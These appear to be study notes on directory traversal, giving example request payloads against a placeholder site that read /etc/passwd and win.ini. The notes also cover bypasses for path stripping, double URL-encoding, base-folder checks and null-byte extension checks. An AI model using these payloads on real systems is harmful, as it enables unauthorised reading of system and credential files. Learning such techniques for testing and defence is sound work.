# Basic

eg - original url => `https://insecure-website.com/loadImage?filename=abc.png`

- will get image from the path `/var/www/images/abc.png`

## Directory Traversal in Linux

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

## Directory Traversal in Windows

`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`

# Common Obstacles

## 1. Blocked with absolute path bypass

- use the absolute path => `filename=/etc/passwd`

eg - `GET /image?filename=/etc/passwd`

## 2. Stripped non-recursively

- use `....//` or `....\/`

eg - `GET /image?filename=....//....//....//etc/passwd`

## 3. Stripped with superfluous URL-decode

- bypass this kind of sanitization by URL encoding, or even double URL encoding, the ../ characters, resulting in %2e%2e%2f or %252e%252e%252f respectively. Various non-standard encodings, such as ..%c0%af or ..%ef%bc%8f, may also do the trick.

eg - `GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1`

first encode the `/` and get `%2f` then encode the `%` from `%2f` and get `%252f`.

## 4. File path traversal, validation of the start of path

- sometimes app requires the user-supplied filename must start with the expected base folder, such as `/var/www/images` and the path will be `filename=/var/www/images/../../../etc/passwd`

eg - `GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1`

## 5. File path traversal, validation of file extension with null byte bypass

- sometimes, filename must end with an expected file extension such as .png, and use null byte `%00` to effectively terminate the file path before the require extension.

eg - ` filename=../../../etc/passwd%00.png`
